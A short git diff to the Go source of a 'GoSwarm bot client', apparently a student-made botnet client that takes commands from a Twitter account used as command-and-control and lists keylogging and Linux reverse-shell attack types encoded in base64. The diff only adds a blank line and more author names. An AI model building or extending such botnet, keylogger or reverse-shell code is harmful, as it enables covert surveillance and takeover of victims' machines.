@@ -22,6 +22,7 @@ Attack Types:
 	- Keylog (a2V5bG9nDQo=)
 	- ReverseShellLinux (cmV2ZXJzZVNoZWxsTGludXg=)
 */
+
 var (
 	commander        string        = "Guava03541902" // Twitter C&C account
 	waitTime         time.Duration = 5               // Time to wait in between each request
@@ -29,7 +30,7 @@ var (
 )
 
 func main() {
-	fmt.Println("GoSwarm bot client created by Pim Trouerbach")
+	fmt.Println("GoSwarm bot client created by Pim Trouerbach, Tristan Saldanha, Rishi Javia, and Shannon Drew")
 	// fmt.Println("Listening on: https://www.twitter.com/" + commander)
 	for true {
 		fmt.Println("Waiting for commands:")
